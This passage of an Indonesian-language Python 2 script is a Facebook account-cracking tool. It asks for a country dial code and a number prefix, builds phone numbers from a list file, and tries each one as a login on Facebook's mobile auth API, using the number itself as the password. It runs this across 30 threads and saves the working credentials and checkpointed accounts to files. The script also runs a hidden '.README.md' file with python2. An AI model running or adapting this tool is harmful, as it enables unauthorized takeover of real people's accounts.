			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="10":
		os.system("clear")
		print (logo)
		print("66, 69, 78, 79, 60, 72, 67, 53, 51")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+48"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="11":
		os.system("clear")
		print (logo)
		print("\033[1;93m01, ~to~~, 49")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="12":		
		os.system("clear")
		print (logo)
		print("\033[1;93m82,57,89,56,81")
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="13":		
		os.system("clear")
		print (logo)
		print("\033[1;93m901, 902, 903, 930, 933, 935, 936, 937, 938, 939") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+98"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="14":		
		os.system("clear")
		print (logo)
		print("\033[1;93m69,693,698,694,695") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+3069"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="15":		
		os.system("clear")
		print (logo)
		print("\033[1;96m070, 071, 079, 072, 073, 078, 077, 076, 074, 075") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+93"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
	elif bch =="16":		
		os.system("clear")
		print (logo)
		print("\033[1;93m11, 21, 57, 41, 15, 52, 31, 23") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+963"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
	elif bch =="17":		
		os.system("clear")
		print (logo)
		print("\033[1;96m322, 264, 416, 272, 472, 382, 312") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+90"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="18":		
		os.system("clear")
		print (logo)
		print("\033[1;96m079, 078, 073, 074") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+964"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="19":		
		os.system("clear")
		print (logo)
		print("\033[1;96m3, 2, 1, 4") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+33"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
	elif bch =="20":		
		os.system("clear")
		print (logo)
		print("\033[1;93m67, 68, 69") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+355"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
	elif bch =="21":		
		os.system("clear")
		print (logo)
		print("\033[1;96m49, 27, 43, 21,33, 49,26, 34,27,38, 29") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+213"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="22":		
		os.system("clear")
		print (logo)
		print("\033[1;95m8, 7, 3") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+376"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="23":		
		os.system("clear")
		print (logo)
		print("\033[1;95m22, 43, 23,53, 46,52, 38") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+374"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="24":		
		os.system("clear")
		print (logo)
		print("\033[1;95m366, 342, 362,365, 349") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+995"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="25":		
		os.system("clear")
		print (logo)
		print("\033[1;95m4, 5") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+354"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="26":		
		os.system("clear")
		print (logo)
		print("\033[1;95m139, 138, 137, 138") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+86"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="27":		
		os.system("clear")
		print (logo)
		print("\033[1;95m2, 7, 5") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+975"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="28":		
		os.system("clear")
		print (logo)
		print("\033[1;95m11") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+976"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="29":		
		os.system("clear")
		print (logo)
		print("\033[1;95m9, 24") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+64"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
	elif bch =="30":		
		os.system("clear")
		print (logo)
		print("\033[1;95m 21, 41, 183, 81") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+249"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="A":		
		os.system("clear")
		print (logo)
		print("\033[1;95m 40, 41, 42, 43, 44, 45, 46, 47, 48") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+92"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="B":		
		os.system("clear")
		print (logo)
		print("\033[1;91m 10, 11, 12, 13, 14, 15, 16, 17, 18") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+92"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="C":		
		os.system("clear")
		print (logo)
		print("\033[1;91m 00, 01, 02, 03, 04, 05, 06") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+92"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="D":				
		os.system("clear")
		print (logo)
		print("\033[1;91m 16, 17, 18") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+80"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
	elif bch =="E":						
		os.system("clear")
		print (logo)
		print("\033[1;91m 13, 14, 15,16, 18") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+80"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
	elif bch =="F":								
		os.system("clear")
		print (logo)
		print("\033[1;91m 14, 19") 
		try:
			c = raw_input(" Masukan Kode  : ")
			k="+80"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu() 
				

		

     
		 
		
	elif bch =="0":
		os.system('rm -rf login.txt')
		keluar()

	xxx = str(len(id))
	print ('[✓] Total Nomor: '+xxx)
	time.sleep(0.1)
	print ('\033[1;91m[✓]\033[1;94m Mohon Tunggu Proses Sedang Berjalan ...')
	time.sleep(0.1)
	print ('[!] Untuk Menghentikan Proses Tekan CTRL Lalu Tekan z')
	time.sleep(0.5)
	print 42*"\033[1;91m="
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[Successful]\033[1;95m ' + k + c + user + ' >>> ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'>>>'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;93m[Checkpoint]\033[1;96m ' + k + c + user + ' >>> ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'>>>'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)

															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;91m="
	print '[✓]\033[1;93m Process Telah Selesai ...'
	print '[✓]\033[1;92m Total OK/\033[1;96mCP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓]\033[1;91m CP File Telah Disimpan : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 .README.md')

if __name__ == '__main__':
	login()
